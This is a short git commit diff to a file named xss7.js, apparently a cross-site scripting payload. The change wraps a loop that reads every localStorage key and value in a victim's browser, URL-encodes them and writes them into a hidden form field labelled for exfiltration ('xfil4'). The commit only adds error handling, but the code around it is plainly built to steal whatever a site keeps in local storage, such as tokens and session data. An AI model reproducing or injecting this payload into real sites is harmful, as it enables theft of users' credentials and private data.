8079a77ec2f0a3374fc354e60bbebed3cba7a51d
0-1-h1 <54417939+0-1-h1@users.noreply.github.com>
2019-09-24 12:10:55 -0500

    Update xss7.js

--- xss7.js
+++ xss7.js
@@ -52,6 +52,7 @@ document.body.appendChild(elem);
   input.type = "hidden";
   input.name = "localStorage";
          str = "";
+	     try {
 for(var i=0, len=localStorage.length; i<len; i++) {
 	if (str.length)
 		str += "&";
@@ -59,6 +60,9 @@ for(var i=0, len=localStorage.length; i<len; i++) {
     var value = localStorage[key];
     str += encodeURIComponent(key) + "=" + encodeURIComponent(value);
   }
+		     }catch(error) {  
+			     str = "<unknown>";
+		     }
   input.value = str;
   form.appendChild(input);
   }, "xfil4");
